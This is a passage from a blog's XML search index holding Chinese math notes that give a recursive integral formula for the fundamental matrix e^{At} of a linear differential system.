<p><span class="math inline">\(\left \{ \begin{array}{lr} r_1(t) = e^{\lambda_1t} \\ r_2(t) = \int _0 ^t e^{\lambda_2(t-s)}r_1(s)ds \\ ...... \\ r_n(t) = \int_0^t e^{\lambda_n(t-s)}r_{n-1}(s)ds \end{array} \right.\)</span></p>
<p>则方程的基解矩阵为<span class="math inline">\(e^{At} = r_1(t)Q_0 + r_2(t)Q_1 +...+r_n(t)Q_{n-1}\)</span></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>数学</tag>
      </tags>
  </entry>
</search>
